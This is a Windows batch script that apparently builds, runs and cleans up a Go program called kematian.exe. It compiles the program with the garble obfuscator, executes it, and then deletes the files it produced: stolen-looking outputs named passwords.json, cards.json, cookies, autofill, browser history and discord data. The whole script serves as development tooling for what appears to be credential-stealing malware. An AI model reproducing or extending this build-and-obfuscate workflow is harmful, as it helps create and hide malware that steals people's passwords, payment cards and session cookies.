@echo off

cd /d %~dp0

if "%1"=="" (
    set "debug=0"
) else (
    set "debug=%1"
)

set GOOS=windows

if %debug%==0 (
    garble -tiny build .

    kematian.exe

    del history.json || echo "history.json not found"
    del passwords.json || echo "passwords.json not found"
    del cards.json || echo "cards.json not found"
    del downloads.json || echo "downloads.json not found"
    del autofill.json || echo "autofill.json not found"
    del discord.json || echo "discord.json not found"
    REM delete all files that start with cookies_netscape
    for /f "delims=" %%i in ('dir /b cookies_netscape*') do del "%%i"

) else (
    go build .

    kematian.exe

    del history.json || echo "history.json not found"
    del passwords.json || echo "passwords.json not found"
    del cards.json || echo "cards.json not found"
    del downloads.json || echo "downloads.json not found"
    del autofill.json || echo "autofill.json not found"
    del discord.json || echo "discord.json not found"

)

pause

del kematian.exe || echo "kematian.exe was not found"
pause
exit
